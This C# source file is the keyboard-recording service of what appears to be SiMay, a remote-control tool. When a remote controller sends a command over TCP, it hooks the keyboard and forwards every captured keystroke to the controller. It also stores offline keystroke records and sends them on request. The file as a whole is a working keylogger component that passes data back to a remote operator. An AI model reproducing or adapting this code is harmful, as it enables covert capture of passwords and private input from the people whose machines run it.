using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.ServiceCore.Attributes;
using SiMay.Sockets.Tcp.Session;

namespace SiMay.ServiceCore
{
    [ServiceName("键盘输入记录")]
    [ServiceKey("RemoteKeyboradJob")]
    public class KeyboardService : ApplicationRemoteService
    {
        private Keyboard _keyboard;
        public override void SessionInited(TcpSocketSaeaSession session)
        {

        }

        public override void SessionClosed()
        {
            if (_keyboard != null)
            {
                _keyboard.NotiyProc -= _keyboard_NotiyProc;
                _keyboard.CloseHook();
                _keyboard = null;
            }
        }

        [PacketHandler(MessageHead.S_KEYBOARD_OFFLINE)]
        public void ActionOffLineRecords(TcpSocketSaeaSession session)
            => _keyboard.StartOfflineRecords();

        [PacketHandler(MessageHead.S_KEYBOARD_GET_OFFLINEFILE)]
        public void SendOffLineRecord(TcpSocketSaeaSession session)
        {
            SendTo(CurrentSession, MessageHead.C_KEYBOARD_OFFLINEFILE,
                _keyboard.GetOfflineRecord());
        }

        [PacketHandler(MessageHead.S_KEYBOARD_ONOPEN)]
        public void Init(TcpSocketSaeaSession session)
        {
            _keyboard = Keyboard.GetKeyboardInstance();
            _keyboard.NotiyProc += new Keyboard.KeyboardNotiyHandler(_keyboard_NotiyProc);
            _keyboard.Initialization();
        }

        private void _keyboard_NotiyProc(Keyboard.KeyboardHookEvent kevent, string key)
        {
            switch (kevent)
            {
                case Keyboard.KeyboardHookEvent.OpenSuccess:
                    break;

                case Keyboard.KeyboardHookEvent.OpenFail:
                    CloseSession();
                    break;

                case Keyboard.KeyboardHookEvent.Data:
                    SendTo(CurrentSession, MessageHead.C_KEYBOARD_DATA, key);
                    break;
            }
        }
    }
}